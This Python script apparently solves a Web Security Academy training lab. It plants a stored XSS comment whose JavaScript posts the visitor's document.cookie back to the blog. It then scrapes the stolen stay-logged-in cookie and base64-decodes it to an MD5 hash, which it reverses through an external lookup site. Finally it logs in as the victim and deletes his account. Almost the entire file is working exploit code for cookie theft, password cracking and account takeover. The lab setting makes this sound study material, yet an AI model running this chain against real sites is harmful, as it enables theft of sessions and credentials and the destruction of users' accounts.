from web_security_academy.core.utils import *
from bs4 import BeautifulSoup
from base64 import b64decode
from hashlib import md5

import re


def solve_lab(session):
    # Part 1: Send XSS payload
    xss = [
        "<script>",
        "var xhr = new XMLHttpRequest();",
        'xhr.open("POST", "/post/comment", true);',
        'xhr.send("postId=1&comment=" + document.cookie + "&name=user&email=user@example.com&website=");',
        "</script>",
    ]
    print_info("Exploiting XSS vulnerability by posting the following comment:")
    comment = "\n".join(xss)
    print(comment, end="\n\n")

    data = {
        "postId": "2",
        "comment": comment,
        "name": "user",
        "email": "user@example.com",
        "website": "",
    }
    session.post_path("/post/comment", data=data)

    # Part 2: Extract Carlos's MD5 password hash
    print_info("Extracting Carlos's stay-logged-in cookie...")
    resp = session.get_path("/post", params={"postId": 1})
    m = re.search(r"stay-logged-in=([A-Za-z0-9\+\/]+)", resp.text)

    if m is None:
        print_fail("Unable to extract Carlos's stay-logged-in cookie.")
    else:
        cookie = m.group(1)
        print_success(f"stay-logged-in={cookie}")

    decoded = b64decode(cookie).decode()
    print_info_secondary(f"Base64 decoded: {decoded}\n")
    carlos_hash = decoded.replace("carlos:", "")

    # Part 3: Offline password crack
    md5_center = "https://md5.gromweb.com/"
    print_info(f'Reversing MD5 hash "{carlos_hash}" on "{md5_center}"...')
    resp = session.get(md5_center, params={"md5": carlos_hash})

    soup = BeautifulSoup(resp.text, "lxml")
    query = soup.select_one("#string")
    if query is None or query.get("value") is None:
        print_fail("Unable to reverse MD5 hash.")
        print(query)
    else:
        password = query.get("value")
        print_success(f"Found password: {password}\n")

    session.login("carlos", password, with_csrf=False)
    print_info("Deleting Carlos's account...")
    session.post_path("/my-account/delete", data={"password": password})
